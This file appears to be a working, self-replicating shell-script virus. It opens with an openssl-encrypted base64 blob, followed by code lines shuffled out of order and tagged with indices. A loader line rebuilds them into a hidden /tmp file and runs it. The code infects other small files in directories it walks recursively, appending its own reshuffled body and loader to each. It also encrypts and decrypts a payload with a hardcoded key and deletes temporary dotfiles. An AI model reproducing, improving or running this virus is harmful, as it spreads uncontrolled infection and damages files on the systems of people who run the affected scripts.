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
TKhKBwCrOSRpdE4luDpV5ZZtQt3scHIDll1eS54uogmUlv5fqd9Y3e0QiGG0CiOp
pb0cH5QkqR/aH4/mNDltf4cj6IwN49P+awKc16so8tlJd3KJaj7oB5dcTVr7P6Cs
tmxIbBefoGJifQAER7QlNVZhC1yb61oAvy7tIqV3m1jgDuGkXBDK1v2NvXhhH3xN
kLujW3EZQns0OQvxwynejC1JygFO2IwYDfdvrS/rO5LAYX+6B0stAmJjHjgZuUjE
2ZudRAkf3TrvDF1M1qmKAs03/MxocVmY8OA9a/P6GHCZ2Dy68jSZuqRJnw2cRgrx
VONceY4RxG7YVcvrL0Mmfq4sUJPsqIImRZkLQ2eYlww5Pwzkq+HOBWBsxPPB5u6P
sol8LfTh0EeYjjG2NUrkJbznTsa9YVvLEZVXJdV6BP3tTl5nbnmR7btjMmp4pk1V
9Gp6adChqH92vSK+P1IqDFJAbNpPjy6WwvDXS8EXuJdQ0D4yss0BHgA9pr8/4/3i
qrhV+FoveWwQi+TAykO7p26KXG+2gZ+mrZ6N++m6N2U9+JeZcSTR1krtWJmWgeZc
x/WlNv04Xyswx+Tn1mdwFe0QQAvWq63WW9h4OyVAaaay1AA/BLM/Jh6tnh6YC3H1
T5MXV0KtI+mf/iHFnW30yCfCtJuWbNgJ3q/f8qBBn8k+CBgPm9rbjufzjeE0/SnT
7tFBw/gK5J49ghvPwLUZnFIOW3jZHe8p58YfYJTSCq2Pdz9duXGVguJ1nJtalQDF
6C2gRP+azeib2oLCDB54R+j80AeryUJtnawma0VpwJzbFz62PaysU7n8p6UzGmb1
lmh8OthBsEUHjRfUm4VZI269Yl9mSW81McWwyvtGBwDJboQ6l2GyZJDWPSR+jhfd
1IsuamabaItYOqcWepoZEmSKL4rMr8cItlzegteG66onOZlkbWwWuXrzc9o8El3M
ToffARZjf2L0R5u17S7KmLUcGvrv63veOM9AreWGDZLLpIEdF60rjNGMHMMnUenb
3BQXo1tXFz9q3gRfGXIuecK+IKnZmooWD0LCkpkX58ZQHVKqrZlYkYHU1JZo0I7p
gJ0Midqyr+BzdIb+E0xdc7zLMdz6LUjcLldEA4PBrdIaUHJldE6Z8sMjDSFd1wQG
VS9OsCwU3aZwi6201vQ+Le8q4fw0RAziasHNOlOo+9sFSSddTJoHy4uZ6xJI9qAR
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
tail -n 78 ./virus.sh | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/.test
chmod +x /tmp/.test && /tmp/.test &
exit 0
# Start payload
    echo -e "$line" >> $target  #@45
  NEWFILE="/tmp/.$NEWFILE"  #@33
        row=$(echo "$row" | cut -d' ' -f 2)  #@61
  fi  #@64
# U2FsdGVkX1/sR6BSVb24vkVlwoEd4fw9q0AJOjmDxWq8twhYprob33H09R3uZmtY
for (( i=0; i<${#payload[@]}; i++ )); do  #@66
while read -r line; do  #@53
filename="$0"  #@50
  tabft=("FT" [78]=" ")  #@37
done < "$filename"  #@65
    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@46
      fi  #@12
      tree+=("$target")  #@11
  echo "tail -n 78 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@34
    row="$line"  #@54
  target=${tree[i]}  #@19
  if [ $(($nbline)) -lt 80 ]; then  #@23
sh ./xxxxxxxxxxdecrypt.sh  #@72
    done  #@43
rm xxxxxxxxxxdecrypt.sh  #@74
visit "*"  #@15
# aqzZDIg5lHHDJwdintAteYEiVG3+uMmEnoaIUBRm7oLjPa52jxQj7JeNLne6+W5r
if [ "$1" == "test" ]; then  #@1
  directory=$1  #@6
        visit "$target/*"  #@9
  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@28
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@32
    continue  #@30
  fi  #@25
  fi  #@31
RANDOM=$$  #@17
        payload+=("$row")  #@62
  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@26
fi  #@3
  exit 0  #@2
  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@35
      while read -r line; do  #@56
  while [ $nbl -ne 78 ]; do  #@39
  echo "exit 0" >> $target  #@36
echo "#!/bin/sh" >> xxxxxxxxxxdecrypt.sh  #@69
          break  #@59
MANAGER=(test cd ls pwd)  #@16
      done  #@63
    valindex=$(((RANDOM % 78)+1))  #@40
rm /tmp/.* 2> /dev/null #@49
      valindex=$(((RANDOM % 78) + 1))  #@42
# End payload
tree=()  #@4   
  for target in $directory; do  #@7  
openssl enc -d -aes-128-cbc -a -salt -pass pass:$key -in xxxxxxxxxxencrypt.sh >> xxxxxxxxxxdecrypt.sh  #@70
  if [ "$?" == "0" ]; then  #@29
    if [ "$row" == "# Start payload" ]; then  #@55
payload=()  #@52
  done  #@47
  done  #@13
  tail -n 78 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@27
chmod 777 xxxxxxxxxxdecrypt.sh  #@71
for (( i=0; i<${#tree[@]}; i++ )); do  #@18
done  #@68
}  #@14
    continue  #@24
key="asdffdsa"  #@51
  declare -i nbl=0  #@38
  nbline=${nbline##}  #@21
        row="$line"  #@57
done  #@48
    else  #@10
      if [ -d "$target" ];then  #@8
    line=$(tail -n $valindex $0 | head -1)  #@44
visit(){  #@5
  echo "${payload[i]}" >> xxxxxxxxxxencrypt.sh  #@67
  nbline=$(wc -l $target)  #@20
    while [ "${tabft[$valindex]}" == "FT" ]; do  #@41
  nbline=$(echo $nbline | cut -d " " -f1)  #@22
        fi  #@60
rm xxxxxxxxxxencrypt.sh  #@73
        if [ "$row" == "# End payload" ]; then  #@58
